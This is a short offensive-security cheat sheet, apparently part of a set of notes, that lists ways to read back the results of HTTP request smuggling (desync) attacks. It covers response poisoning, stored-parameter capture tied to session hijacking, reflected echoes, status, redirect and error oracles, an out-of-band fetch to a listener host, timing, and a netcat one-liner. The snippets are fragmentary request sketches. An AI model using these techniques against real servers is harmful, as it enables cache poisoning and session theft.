# Desync readback deep — every output channel

## The self-poison — the primary

```text
POST / [desync: GET /marker] → GET / → the GET's response is /marker
```

`response-poisoning.md` — the self-poison's channel.

## The stored-param — `POST /store` + `GET /store/last`

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

`session-hijack.md` — the stored readback.

## The echo — `GET /search?q=X`

```text
GET /search?q=MARKER HTTP/1.1
```

`smuggle-readback.md` — the echo.

## The status — the smuggle's status

```text
GET /admin HTTP/1.1
```

`smuggle-readback.md` — the status readback.

## The Location — the smuggle's `Location:`

```text
GET /redirect?to=/marker HTTP/1.1
```

`smuggle-readback.md`.

## The error-body — the smuggle's error

```text
GET /invalid-path HTTP/1.1
```

`smuggle-readback.md`.

## The OOB — the smuggle's URL-fetch

```text
GET /?url=http://oob.t/m HTTP/1.1
```

`blind-smuggle.md` — the OOB-listener.

## The header — `X-Debug: marker`

```text
GET / HTTP/1.1
X-Debug: marker
```

`smuggle-readback.md`.

## The body-length — the `Content-Length` delta

```text
GET /flag HTTP/1.1
```

`smuggle-readback.md` — the length-readback.

## The timing — the delay

```text
GET /slow HTTP/1.1
```

`smuggle-readback.md` — weakest.

## The deferred — the async job

```text
store the smuggle → the job runs → the job's log
```

`webhook-deferred.md`.

## The socket-accounting — the response-count

```bash
printf 'POST / [desync] GET / HTTP/1.1\r\n\r\n' | nc t 80
```

`detection-oracle.md`.
